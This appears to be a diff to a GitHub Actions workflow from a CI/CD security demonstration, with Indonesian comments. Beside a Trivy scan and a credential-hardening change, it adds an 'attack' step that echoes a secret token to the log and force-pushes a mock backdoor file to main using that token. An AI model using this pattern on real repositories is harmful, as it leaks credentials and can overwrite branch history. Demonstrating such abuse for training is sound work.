@@ -7,6 +7,8 @@ jobs:
     steps:
       - name: Checkout Code
         uses: actions/checkout@v3
+        with:
+          persist-credentials: false # <--- WAJIB ADA
 
       - name: Run Trivy Scan
         uses: aquasecurity/trivy-action@master
@@ -17,13 +19,21 @@ jobs:
           exit-code: '1' # GAGALKAN pipeline jika ditemukan celah High/Critical
           severity: 'CRITICAL,HIGH'
 
-      - name: Attack - Malicious Actor Trying to Modify Repo
+      - name: Attack - Successful Privilege Abuse
+        env:
+          MY_SECRET_TOKEN: ${{ secrets.HACKER_TOKEN }}
         run: |
-          echo "Penyerang mencoba menyisipkan file backdoor via Pipeline..."
+          echo "Memulai serangan menggunakan leaked Token"
           git config --global user.email "hacker@evil.com"
           git config --global user.name "Hacker Jahat"
-          echo "malicious_content" > backdoor_via_pipeline.txt
-          git add backdoor_via_pipeline.txt
-          git commit -m "Penyerangan dari Inside"
-          # Jika token memiliki izin WRITE, perintah push di bawah ini akan BERHASIL
-          git push origin main
+          
+          echo "BERHASIL TEMBUS" > Backdoor_Virus.txt
+          
+          # Kita pastikan token terdeteksi (GitHub akan menyensornya dengan ***)
+          echo "Token check: $MY_SECRET_TOKEN"
+          
+          git add Backdoor_Virus.txt
+          git commit -m "EVIL: Exploit"
+          
+          # Gunakan variabel env dengan tanda kutip agar aman
+          git push --force "https://x-access-token:${MY_SECRET_TOKEN}@github.com/${{ github.repository }}.git" main
